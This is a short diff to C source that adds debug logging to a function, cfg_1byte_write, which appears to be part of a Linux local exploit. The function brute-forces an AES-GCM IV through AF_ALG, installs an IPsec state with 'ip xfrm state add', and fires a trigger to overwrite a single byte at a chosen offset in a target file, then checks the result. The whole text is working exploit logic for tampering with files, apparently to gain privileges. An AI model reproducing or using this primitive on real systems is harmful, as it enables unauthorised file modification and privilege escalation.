@@ -377,6 +377,9 @@ bool cfg_1byte_write(const char *target_path,
 
     uint8_t want_ks = cur ^ want_byte;
 
+    log_step("cfg_1byte_write off=%lld 0x%02x -> 0x%02x (need_ks=0x%02x)",
+             (long long)target_off, cur, want_byte, want_ks);
+
     /* Brute force IV via AF_ALG. */
     uint8_t iv[IV_LEN];
     int64_t iters = gcm_brute_iv(want_ks, iv);
@@ -384,18 +387,21 @@ bool cfg_1byte_write(const char *target_path,
         log_bad("gcm IV brute force failed (want_ks=0x%02x)", want_ks);
         return false;
     }
+    log_step("  IV found in %lld iters", (long long)iters);
 
     /* Install SA. */
     if (!gcm_install_sa(iv)) {
         log_bad("ip xfrm state add failed");
         return false;
     }
+    log_step("  SA installed");
 
     /* Trigger. */
     if (!gcm_trigger(target_path, target_off, iv)) {
         log_bad("gcm trigger failed");
         return false;
     }
+    log_step("  trigger fired");
 
     /* Verify. */
     int v = open(target_path, O_RDONLY);
